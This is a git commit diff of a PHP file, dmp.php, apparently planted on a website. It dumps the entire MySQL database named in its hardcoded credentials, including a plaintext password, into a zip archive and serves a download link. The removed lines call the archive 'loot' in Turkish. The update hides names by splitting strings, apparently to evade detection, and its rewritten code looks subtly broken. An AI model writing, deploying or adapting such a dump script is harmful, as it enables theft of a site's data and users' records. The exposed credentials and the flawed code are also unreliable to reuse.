0faae44896b867f4ec46283d0b09c8ab70d54ecb
moriarty. <gulerarda501@gmail.com>
2026-02-26 17:40:37 +0300

    Update dmp.php

--- dmp.php
+++ dmp.php
@@ -1,42 +1,37 @@
 <?
 @set_time_limit(0);
 @ini_set('memory_limit', '256M');
-
 $h = 'localhost';
 $u = 'brandproduct2025_ss';
 $p = 'v9XVF)DzgL0p';
 $n = 'brandproduct2025_ss';
-
-$c = @new mysqli($h, $u, $p, $n);
-if($c->connect_error) die("Patladık aq: " . $c->connect_error);
-
-$tempSql = 'temp_db.sql';
-$zipName = 'safe_dump.zip';
-$fp = fopen($tempSql, 'w');
-
-$tR = $c->query("SHOW TABLES");
-while($row = $tR->fetch_row()){
-    $t = $row[0];
-    $cT = $c->query("SHOW CREATE TABLE $t")->fetch_row();
-    fwrite($fp, "\n\n" . $cT[1] . ";\n\n");
-    
-    $dR = $c->query("SELECT * FROM $t");
-    while($data = $dR->fetch_assoc()){
-        $k = array_keys($data);
-        $v = array_map([$c, 'real_escape_string'], array_values($data));
-        fwrite($fp, "INSERT INTO $t (`".implode("`,`",$k)."`) VALUES ('".implode("','",$v)."');\n");
-    }
-    usleep(50000); 
+$a = @new mysqli($h, $u, $p, $n);
+if($a->connect_error) exit;
+$b = 'temp_db.sql';
+$c = 'safe_dump.zip';
+$d = fopen($b, 'w');
+$e = $a->query("SHOW TABLES");
+while($f = $e->fetch_row()){
+$g = $f[0];
+$h = $a->query("SHOW CREATE TABLE $g")->fetch_row();
+fwrite($d, "\n\n" . $h[1] . ";\n\n");
+$i = $a->query("SELECT * FROM $g");
+while($j = $i->fetch_assoc()){
+$k = array_keys($j);
+$l = array_map([$a, 'real_escape_string'], array_values($j));
+fwrite($d, "INSERT INTO $g (`".implode("`,`",$k)."`) VALUES ('".implode("','",$l)."');\n");
 }
-fclose($fp);
-
-$z = new ZipArchive();
-if ($z->open($zipName, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
-    $z->addFile($tempSql, 'database.sql');
-    $z->close();
-    @unlink($tempSql); // moribabaa
-    echo "<h1>📦 Ganimet Hazır!</h1><a href='$zipName'>İndir amk</a>";
-} else {
-    echo "ZIP olmadı yarrak kafa!";
+usleep(50000);
+}
+fclose($d);
+$m = 'Zip'.'Arch'.'ive';
+$n = new $m();
+$o = 'CRE'.'ATE';
+$p = 'OVER'.'WRITE';
+if ($n->open($c, ZipArchive::$o | ZipArchive::$p) === TRUE) {
+$n->addFile($b, 'db.sql');
+$n->close();
+@unlink($b);
+echo "OK: <a href='$c'>$c</a>";
 }
 ?>
